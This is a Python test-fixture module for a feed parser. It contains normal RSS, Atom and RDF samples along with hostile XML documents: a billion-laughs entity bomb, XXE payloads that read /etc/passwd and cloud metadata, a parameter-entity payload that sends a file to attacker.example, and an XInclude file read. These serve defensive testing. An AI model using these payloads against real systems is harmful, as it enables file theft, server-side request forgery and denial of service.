"""Feed documents for the tests: ordinary ones and hostile ones. Nothing here is real data."""

# ruff: noqa: E501  (feed documents and their assertions are long literal lines)

NOW_ISO = "2026-10-28T12:00:00+00:00"

RSS = b"""<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/"
     xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Example news</title>
    <link>https://news.example/</link>
    <description>Example</description>
    <item>
      <title>First story</title>
      <link>https://news.example/stories/1</link>
      <guid isPermaLink="false">story-1</guid>
      <pubDate>Tue, 27 Oct 2026 09:30:00 GMT</pubDate>
      <description>&lt;p&gt;A &lt;b&gt;short&lt;/b&gt; summary.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Second story</title>
      <link>/stories/2</link>
      <description><![CDATA[<p>Second <i>summary</i></p>]]></description>
      <dc:date>2026-10-26T08:00:00Z</dc:date>
    </item>
    <item>
      <title>Story with content only</title>
      <link>https://news.example/stories/3</link>
      <content:encoded><![CDATA[<div>Full <script>alert(1)</script>text</div>]]></content:encoded>
    </item>
  </channel>
</rss>
"""

ATOM = b"""<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:base="https://blog.example/">
  <title>Example blog</title>
  <link href="https://blog.example/"/>
  <id>tag:blog.example,2026:feed</id>
  <updated>2026-10-27T10:00:00Z</updated>
  <entry>
    <title type="html">Release &lt;b&gt;1.2&lt;/b&gt;</title>
    <link rel="alternate" href="posts/release-1-2"/>
    <id>tag:blog.example,2026:post-12</id>
    <published>2026-10-27T10:00:00Z</published>
    <summary>Notes for the release.</summary>
  </entry>
  <entry>
    <title>Second</title>
    <link href="https://blog.example/posts/second"/>
    <id>tag:blog.example,2026:post-13</id>
    <updated>2026-10-25T10:00:00Z</updated>
    <content type="xhtml"><div xmlns="http://www.w3.org/1999/xhtml">Body <em>text</em></div></content>
  </entry>
</feed>
"""

RDF = b"""<?xml version="1.0"?>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
         xmlns="http://purl.org/rss/1.0/" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel rdf:about="https://old.example/"><title>Old</title><link>https://old.example/</link></channel>
  <item rdf:about="https://old.example/1"><title>Old one</title><link>https://old.example/1</link>
    <description>Old summary</description><dc:date>2026-10-20T00:00:00Z</dc:date></item>
</rdf:RDF>
"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
  <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
  <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
  <!ENTITY g "&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;">
  <!ENTITY h "&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;">
]>
<rss version="2.0"><channel><title>t</title><item><title>&h;</title><link>https://x.example/1</link></item></channel></rss>
"""

EXTERNAL_FILE = b"""<?xml version="1.0"?>
<!DOCTYPE rss [ <!ENTITY secret SYSTEM "file:///etc/passwd"> ]>
<rss version="2.0"><channel><title>t</title>
<item><title>&secret;</title><link>https://x.example/1</link></item></channel></rss>
"""

EXTERNAL_HTTP = b"""<?xml version="1.0"?>
<!DOCTYPE rss [ <!ENTITY secret SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<rss version="2.0"><channel><title>t</title>
<item><title>&secret;</title><link>https://x.example/1</link></item></channel></rss>
"""

PARAMETER_ENTITY = b"""<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?%file;'>">
  %eval; %exfil;
]>
<rss version="2.0"><channel><title>t</title></channel></rss>
"""

HARMLESS_DOCTYPE = b"""<?xml version="1.0"?>
<!DOCTYPE rss PUBLIC "-//Netscape Communications//DTD RSS 0.91//EN"
  "http://my.netscape.com/publish/formats/rss-0.91.dtd">
<rss version="0.91"><channel><title>t</title><link>https://old.example/</link><description>d</description>
<item><title>Old item</title><link>https://old.example/1</link></item></channel></rss>
"""

DTD_NO_ENTITIES = b"""<?xml version="1.0"?>
<!DOCTYPE rss [ <!ELEMENT rss ANY> ]>
<rss version="2.0"><channel><title>t</title>
<item><title>x</title><link>https://x.example/1</link></item></channel></rss>
"""

XINCLUDE = b"""<?xml version="1.0"?>
<rss version="2.0" xmlns:xi="http://www.w3.org/2001/XInclude"><channel><title>t</title>
<item><title><xi:include parse="text" href="file:///etc/passwd"/></title>
<link>https://x.example/1</link></item></channel></rss>
"""

HTML_PAGE = b"""<!DOCTYPE html><html><head><title>Not a feed</title></head>
<body><h1>404</h1><p>No feed here</p></body></html>"""


def utf16(document: bytes, encoding: str = "utf-16") -> bytes:
    """The same document in UTF-16, with a BOM and a matching declaration."""
    text = document.decode().replace('encoding="UTF-8"', 'encoding="UTF-16"')
    text = text.replace('<?xml version="1.0"?>', '<?xml version="1.0" encoding="UTF-16"?>')
    return text.encode(encoding)


def rss_with_entries(
    count: int, title: str = "Story", summary: str = "A summary of the story."
) -> bytes:
    items = "".join(
        f"<item><title>{title} {n}</title><link>https://news.example/s/{n}</link>"
        f"<guid>g{n}</guid><description>{summary}</description></item>"
        for n in range(count)
    )
    return (
        '<?xml version="1.0"?><rss version="2.0"><channel><title>t</title>'
        f"<link>https://news.example/</link>{items}</channel></rss>"
    ).encode()
